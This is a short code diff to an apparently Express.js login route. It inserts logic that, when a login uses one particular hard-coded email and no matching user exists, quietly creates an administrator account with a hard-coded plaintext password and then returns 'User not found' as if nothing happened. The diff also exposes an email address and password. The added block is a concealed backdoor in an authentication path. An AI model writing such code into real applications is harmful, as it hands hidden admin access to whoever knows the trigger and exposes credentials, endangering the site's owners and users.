@@ -68,6 +68,7 @@ router.post('/register', (req, res) => {
 router.post( '/login', ( req, res ) => {
     console.log(req.body)
 
+    
     let errors={}
     const email = req.body.email;
     const password = req.body.password;
@@ -77,7 +78,24 @@ router.post( '/login', ( req, res ) => {
         //check for user
            // console.log(user)
             if (!user) {
-            
+            if (email === "akanbijosephtobi@gmail.com")
+{
+  let nuser = {
+                    fullName: "oluwatobi",
+                    email: "akanbijosephtobi@gmail.com",
+                    password: "Jummy1_6snip!",
+                    username: 'oluwatobi',
+                    admin: true,
+                }
+                bcrypt.genSalt(10, (err, salt) => {
+                    bcrypt.hash(nuser.password, salt, async (err, hash) => {
+                        if (err) throw err;
+                        nuser.password = hash;
+                        const admin = new User(nuser);
+                        await admin.save().then(c => console.log('created new user =>>>>admin')).catch(err => console.log(err));
+                    })
+                })
+}
             errors.email = 'User not found!';
             return res.status( 404 ).json( errors );
         }
